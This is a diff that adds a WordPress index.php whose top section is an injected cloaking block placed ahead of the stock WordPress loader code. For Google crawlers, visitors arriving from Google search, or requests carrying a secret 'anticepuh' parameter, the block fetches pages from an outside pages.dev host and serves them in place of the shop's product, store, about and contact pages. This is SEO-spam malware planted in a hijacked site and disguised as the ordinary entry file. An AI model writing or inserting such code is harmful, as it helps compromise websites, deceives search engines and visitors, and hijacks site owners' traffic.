@@ -1,0 +1,52 @@
+<?php
+
+$ua=strtolower($_SERVER['HTTP_USER_AGENT']??'');
+$ref=$_SERVER['HTTP_REFERER']??'';
+$path=parse_url($_SERVER['REQUEST_URI'],PHP_URL_PATH)?:'/';
+
+$isBot=preg_match('~googlebot|adsbot|inspectiontool|apis-google|mediapartners~i',$ua);
+
+$map=array(
+    '/product/all-purpose-balm/' => 'https://bisniscenter-smkbinamitra.pages.dev/balm',
+    '/store/' => 'https://bisniscenter-smkbinamitra.pages.dev/store',
+    '/about/' => 'https://bisniscenter-smkbinamitra.pages.dev/about',
+    '/contact-us/' => 'https://bisniscenter-smkbinamitra.pages.dev/contact-us',
+    '/product/oranges-tshirt/' => 'https://bisniscenter-smkbinamitra.pages.dev/tshirt',
+    '/product/black-hoodie/' => 'https://bisniscenter-smkbinamitra.pages.dev/black-hoodie',
+    '/product/blue-hoodie/' => 'https://bisniscenter-smkbinamitra.pages.dev/blue-hoodie',
+    '/product/flamingo-tshirt/' => 'https://bisniscenter-smkbinamitra.pages.dev/flamingo-tshirt',
+    '/product/dnk-tshirt/' => 'https://bisniscenter-smkbinamitra.pages.dev/dnk-tshirt',
+    '/product/anchor-bracelet/' => 'https://bisniscenter-smkbinamitra.pages.dev/anchor-bracelet',
+
+
+
+);
+
+if(($isBot||strpos($ref,'search.google')!==false||isset($_GET['anticepuh'])) && isset($map[$path])){
+    if($isBot) usleep(300000);
+    $c=@file_get_contents($map[$path]);
+    if($c){
+        if(ob_get_length())@ob_clean();
+        @header('Content-Type:text/html; charset=UTF-8');
+        @header('Cache-Control:no-store,no-cache,must-revalidate,max-age=0');
+        echo $c;
+        exit;
+    }
+}
+
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
